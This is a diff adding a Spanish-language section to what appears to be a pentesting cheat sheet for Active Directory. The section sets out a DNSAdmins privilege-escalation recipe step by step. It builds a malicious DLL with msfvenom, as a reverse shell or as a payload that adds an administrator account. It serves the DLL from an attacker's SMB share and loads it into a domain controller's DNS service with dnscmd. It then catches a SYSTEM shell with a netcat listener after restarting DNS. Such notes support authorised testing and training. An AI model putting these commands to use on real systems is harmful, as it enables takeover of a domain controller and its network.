@@ -92,6 +92,35 @@ Paso 5:
 	# IP-DC = La dirección IP del DC
 ```
 
+## DNSAdmins - PrivEsc
+```bash 
+Los miembros pueden cargar una DLL arbitraria en el servicio DNS que corre como 'SYSTEM' en el DC.
+
+Paso 1: Generar la DLL maliciosa
+# Reverse shell
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f dll -o evil.dll
+
+# O solo agregar usuario admin
+❯ msfvenom -p windows/x64/exec CMD="net localgroup administrators tuusuario /add" -f dll -o evil.dll
+
+Paso 2: Compartir la DLL desde Kali
+❯ impacket-smbserver smbFolder $(pwd) -smb2support
+
+Paso 3: Cargar la DDL en el servicio DNS del server víctima
+❯ dnscmd.exe <DC01> /config /serverlevelplugindll \\IP_Kali\smbFolder\evil.dll
+	# DC01 = Es el nombre del DC y sale con nxc 
+
+Paso 4: Listener en Kali
+❯ rlwrap nc -nlcp 4444
+
+Paso 5: Reiniciar el servicio 
+❯ sc.exe stop dns 
+❯ sc.exe start dns
+
+NOTA:
+	- Si no funciona a la primera hacerlo varias veces 
+```
+
 ## Certificate Service DCOM Access
 ```powershell 
 Acceso remoto vía DCOM al servicio de Certificate Authority (CA).  
